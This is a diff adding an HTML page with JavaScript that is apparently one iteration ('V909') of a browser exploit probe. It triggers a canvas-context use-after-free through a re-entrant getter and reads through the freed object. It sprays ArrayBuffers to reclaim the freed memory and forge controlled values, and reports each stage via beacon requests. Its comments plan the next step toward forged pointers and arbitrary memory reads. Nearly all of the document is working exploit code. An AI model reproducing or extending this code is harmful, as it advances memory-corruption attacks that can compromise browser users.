@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V909</title></head>
+<body><pre id="out">V909 — synchronously free a grown-state ctx (getter trigger), then control B1</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<40;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++]||(new Image());
+  img.src='/beacon/V909-'+tag+'?d='+encodeURIComponent(String(d).slice(0,800))+'&t='+Date.now();
+}
+
+/*
+ * v908: dropping refs didn't free the ctx (GC lazy, read stayed 1014).
+ * This probe uses the SYNCHRONOUS free of the original trigger:
+ *   - the re-entrant getter creates the 2d ctx AND grows its stateStack
+ *     (save x15 -> B1, 6400B) INSIDE the getter window
+ *   - the outer bitmaprenderer call then frees that ctx + B1 synchronously
+ *     (the proven p553/p900 free)
+ *   - the stale innerCtx dangles at the freed 768B chunk whose
+ *     m_stateStack.m_buffer points at the freed B1
+ * Step A: read lineWidth with both chunks freed and unreclaimed
+ *         -> 1014-ish = bytes intact, chain alive through the corpse
+ *         -> crash  = the ctx chunk (or B1) was zeroed/invalid at free
+ * Step B: AB(6400) ZERO spray  -> re-read. lw changes (e.g. 0.0) = B1 IS the
+ *         read path and is now under our hand.
+ * Step C: AB(6400) FORGE spray (fill doubles) -> re-read. lw = fill = full
+ *         control -> v910 forges real pointers (arb read).
+ * Sync XHR beacons before every read.
+ */
+
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/V909-'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+
+/* PHASE 1: trigger with the grow INSIDE the getter window */
+var canvas = document.createElement('canvas');
+canvas.width = 1; canvas.height = 1;
+var innerCtx = null;
+var uafOpts = {};
+Object.defineProperty(uafOpts, 'alpha', {get: function() {
+  innerCtx = canvas.getContext('2d');
+  if (innerCtx) {
+    innerCtx.lineWidth = 99999.5;
+    for (var i = 0; i < 15; i++) { innerCtx.save(); innerCtx.lineWidth = 1000 + i; }
+  }
+  return true;
+}});
+var bmr = canvas.getContext('bitmaprenderer', uafOpts);
+b('P1 trigger inner=' + (innerCtx ? 'OK' : 'NULL') + ' bmr=' + (bmr ? 'OK' : 'NULL') + ' same=' + (innerCtx === bmr));
+
+if (!innerCtx) { b('DEAD no-inner'); }
+else {
+  /* PHASE 2: read through the corpse — both chunks freed, nothing reclaimed */
+  b('P2-PRE');
+  var lw1 = null;
+  try { lw1 = innerCtx.lineWidth; } catch (e) { lw1 = 'ERR:' + e.name; }
+  b('P2 lw=' + lw1);
+
+  if (typeof lw1 === 'number') {
+    /* PHASE 3: AB(6400) ZERO spray -> re-read */
+    var zabs = [];
+    for (var z = 0; z < 200; z++) zabs.push(new ArrayBuffer(6400));
+    b('P3 zerospray n=200');
+    b('P3-PRE');
+    var lw2 = null;
+    try { lw2 = innerCtx.lineWidth; } catch (e) { lw2 = 'ERR:' + e.name; }
+    b('P3 lw=' + lw2);
+
+    if (typeof lw2 === 'number' && lw2 !== lw1) {
+      /* PHASE 4: AB(6400) FORGE spray -> re-read */
+      var FILL = 4321.7654;
+      var fabs = [];
+      for (var f = 0; f < 200; f++) {
+        var ab = new ArrayBuffer(6400);
+        var dv = new DataView(ab);
+        for (var o = 0; o < 6400; o += 8) dv.setFloat64(o, FILL, true);
+        fabs.push(ab);
+      }
+      b('P4 forgespray n=200');
+      b('P4-PRE');
+      var lw3 = null;
+      try { lw3 = innerCtx.lineWidth; } catch (e) { lw3 = 'ERR:' + e.name; }
+      b('P4 lw=' + lw3);
+      if (typeof lw3 === 'number' && Math.abs(lw3 - FILL) < 0.01) {
+        b('VERDICT ***STATE-BUFFER-CONTROLLED*** oracle-born');
+      } else {
+        b('VERDICT partial lw3=' + lw3);
+      }
+    } else if (typeof lw2 === 'number' && lw2 === lw1) {
+      b('VERDICT read-not-through-B1 (unchanged ' + lw1 + ')');
+    } else {
+      b('VERDICT crashed-at-zerospray lw1=' + lw1);
+    }
+  } else {
+    b('VERDICT crashed-at-first-read (chunk zeroed at free?) lw1=' + lw1);
+  }
+}
+</script></body></html>
